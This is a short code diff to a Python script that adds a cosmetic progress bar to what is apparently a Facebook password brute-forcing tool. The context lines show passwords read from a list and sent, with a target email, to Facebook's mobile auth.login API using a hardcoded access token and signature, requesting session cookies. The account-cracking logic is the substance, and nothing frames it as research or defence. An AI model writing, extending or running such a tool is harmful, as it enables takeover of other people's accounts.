@@ -82,8 +82,17 @@ def start():
             pw = pw.strip()  # Remove leading/trailing whitespace and newline characters
             try:
                 # Prompt indicating retrieving password
-                print("\033[34;1m[\033[37;1m=\033[34;1m] \033[37;1mRetrieving Password...")
-                
+                print("\033[34;1m[\033[37;1m=\033[34;1m] \033[37;1mGetting Password...")
+                sys.stdout.write('[%s]' % ('-\033[37;1m' * toolbar_width))
+                sys.stdout.flush()
+                for _ in range(toolbar_width):
+                    sys.stdout.write('\r')
+                    sys.stdout.flush()
+                    sys.stdout.write('\033[37;1m[')
+                    sys.stdout.write('\033[36;1m#\033[37;1m' * (_ + 1))
+                    sys.stdout.flush()
+                    time.sleep(5.0 / 100)
+
                 # Perform login attempt using the password
                 response = requests.get(f'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email={email}&locale=en_US&password={pw}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                 data = response.json()
